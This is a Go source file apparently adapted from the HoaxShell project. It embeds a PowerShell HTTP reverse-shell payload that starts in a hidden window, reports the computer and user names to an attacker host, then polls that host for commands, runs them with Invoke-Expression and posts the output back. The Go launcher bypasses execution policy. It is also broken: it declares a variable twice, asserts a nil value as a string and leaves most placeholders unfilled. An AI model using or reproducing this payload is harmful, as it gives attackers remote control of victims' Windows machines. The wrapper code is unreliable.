package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

var info = map[string]string{
	"Title":       "Windows PowerShell IEX HoaxShell",
	"Author":      "Panagiotis Chartas (t3l3machus)",
	"Description": "An Http based beacon-like reverse shell that utilizes IEX",
	"References":  "https://github.com/t3l3machus/hoaxshell, https://revshells.com",
}

var meta = map[string]string{
	"handler": "hoaxshell",
	"type":    "ps-iex",
	"os":      "windows",
	"shell":   "powershell.exe",
}

var config = map[string]float64{
	"frequency": 0.8,
}

var parameters = map[string]interface{}{
	"lhost": nil,
}

var attrs = map[string]interface{}{
	"obfuscate": true,
	"encode":    true,
}

var data = `
Start-Process $env:windir\sysnative\WindowsPowerShell\v1.0\powershell.exe -ArgumentList {
    $ConfirmPreference="None";
    $s='*LHOST*';
    $i='*SESSIONID*';
    $p='http://';
    $v=Invoke-RestMethod -UseBasicParsing -Uri "$p$s/*VERIFY*/$env:COMPUTERNAME/$env:USERNAME" -Headers @{"*HOAXID*"=$i};
    for (;;) {
        $c=(Invoke-RestMethod -UseBasicParsing -Uri "$p$s/*GETCMD*" -Headers @{"*HOAXID*"=$i});
        if ($c -ne 'None') {
            $r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;
            $r=Out-String -InputObject $r;
            $x=Invoke-RestMethod -Uri "$p$s/*POSTRES*" -Method POST -Headers @{"*HOAXID*"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')
        }
        Start-Sleep -Seconds *FREQ*
    }
} -WindowStyle Hidden
`

func main() {
	lhost := parameters["lhost"].(string)
	data := strings.Replace(data, "*LHOST*", lhost, -1)
	data := strings.Replace(data, "*SESSIONID*", "session123", -1) // Replace with actual session ID

	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", data)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()

	frequency := config["frequency"]
	for {
		cmd := exec.Command("timeout", "/T", fmt.Sprintf("%.0f", frequency))
		cmd.Run()
	}
}
